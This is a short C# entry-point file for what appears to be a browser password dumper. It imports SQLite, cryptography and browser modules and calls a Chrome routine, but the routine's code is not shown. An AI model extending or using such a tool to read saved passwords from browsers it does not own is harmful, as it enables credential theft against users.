using System;
using System.Text;
using System.IO;
using System.Text.RegularExpressions;
using System.Security.Cryptography;
using Community.CsharpSqlite.SQLiteClient;
using BrowserPassword.crypto;
using BrowserPassword.Browsers;

namespace BrowerPasswd
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Chrome chrome = new Chrome();
            chrome.gogogo_Chrome();
        }
    }
}

